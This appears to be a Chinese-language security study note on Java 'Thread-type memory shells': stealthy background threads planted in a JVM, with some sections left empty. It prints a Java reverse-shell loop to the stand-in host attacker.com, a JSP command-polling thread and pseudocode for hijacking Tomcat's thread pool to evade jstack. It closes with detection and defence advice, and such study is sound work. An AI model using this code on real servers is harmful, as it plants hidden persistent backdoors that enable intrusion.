---
title: 
description: 
tags: []
status: 
finish-date: 
difficulty: 
---

# Thread 型内存马


## Thread 型内存马是什么
>Thread 型内存马的核心思想是：在目标 JVM 中启动一个后台线程，该线程持续运行，执行恶意操作（如命令执行、反弹 Shell、数据窃取），而不依赖任何 Web 组件（Filter/Listener/Servlet）。

它的核心概念很简单：在内存中跑一个看不见的“幽灵线程”，这个线程会持续干坏事。
## 核心原理
>在 Java 中，线程是 JVM 调度执行的基本单位。一个 Web 应用通常有大量的线程池（如 Tomcat 的请求处理线程池）。攻击者可以利用代码执行漏洞，创建并启动一个新的后台线程，这个线程会持续运行，执行恶意代码。

```java
// 核心代码：启动一个后台线程
new Thread(new Runnable() {
    @Override
    public void run() {
        while (true) {
            try {
                // 恶意操作：执行系统命令、反弹Shell、数据窃取
                Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
                Thread.sleep(60000); // 每分钟执行一次
            } catch (Exception e) {
                // 静默处理
            }
        }
    }
}).start();
```
## Thread 型内存马的两种形态
### 形态一：独立线程（“幽灵线程”）
>特点：不依赖任何 Web 组件，完全独立运行

```jsp
<%
// 启动一个独立的后台线程
new Thread(() -> {
    while (true) {
        try {
            // 每 10 秒检查一次是否有待执行的命令
            String cmd = getCommandFromSomewhere(); // 从文件/数据库/网络获取命令
            if (cmd != null) {
                Runtime.getRuntime().exec(cmd);
            }
            Thread.sleep(10000);
        } catch (Exception e) {
            // 静默
        }
    }
}).start();
%>
```
### 形态二：劫持已有线程（“线程寄生”）
>特点：不创建新线程，而是劫持 Tomcat 已有的线程池，在现有线程中插入恶意逻辑。
>
>这种形态更加隐蔽，因为它不会增加新的线程（jstack 看不到额外的线程），更难被检测。

```jsp
// 通过反射劫持 Tomcat 的线程池
// 伪代码：在 Tomcat 的线程执行任务之前插入恶意代码
ThreadPoolExecutor executor = getTomcatThreadPool();
executor.setThreadFactory(new ThreadFactory() {
    @Override
    public Thread newThread(Runnable r) {
        // 包装原始的 Runnable
        Runnable wrapped = () -> {
            try {
                // 执行恶意代码
                checkAndExecuteCommand();
            } catch (Exception e) {
                // 静默
            }
            // 执行原始任务
            r.run();
        };
        return new Thread(wrapped);
    }
});
```
## 典型场景
### 定时任务
```jsp
```
### 反弹shell
```jsp
```

### 内存中的命令队列
```jsp
```
## 完整注入器（JSP）

## 优势与局限
### 优势

- 完全独立	不依赖任何 Web 组件，即使 Filter/Controller 被清理，线程依然运行

- 无 URL 暴露	不需要访问任何路径触发，无法被流量审计发现

- 适合持久化后门	可以持续执行定时任务、反弹 Shell、数据窃取

- 多线程能力	可以同时执行多个恶意任务

### 局限性

- 重启即失效	应用重启后线程消失

- 回显困难	不像 Filter/Servlet 那样可以直接通过 response 回显

- 需要独立通道	命令和结果需要通过其他方式传递（如共享变量、文件、网络）

- 可能被线程池管理	如果应用有线程池监控，可能被观察到
  
## 检测与防御
### 检测方法

- jstack 分析	查看 JVM 中所有线程，发现可疑的线程名称或堆栈

- 线程数量监控	异常增加的线程数可能意味着被植入后门

- JMX 监控	通过 JMX 查看线程池状态

- RASP 监控	监控 Thread.start() 的调用
  
### 防御建议

- 限制代码执行入口：防止 JSP 上传、反序列化等漏洞

- 线程监控：定期检查 JVM 线程状态

- 使用 RASP：Hook Thread.start() 和 ScheduledExecutorService.schedule()

- 定期重启：重启应用可以清除线程型内存马

## 总结
>Thread 型内存马的本质是：利用代码执行入口，在目标 JVM 中创建一个独立的后台线程，该线程不依赖任何 Web 组件，独立运行并执行恶意操作（如定时执行命令、反弹 Shell），实现高隐蔽性的持久化后门。